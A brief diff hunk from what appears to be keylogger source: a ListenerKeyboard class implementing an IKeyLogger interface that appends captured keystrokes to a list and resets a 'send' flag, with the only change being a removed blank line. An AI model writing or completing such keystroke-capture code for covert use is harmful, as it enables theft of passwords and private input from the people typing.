@@ -40,4 +40,3 @@ class ListenerKeyboard(IKeyLogger):
             self.list = []
             self.send = False
         self.list.append(key)
-
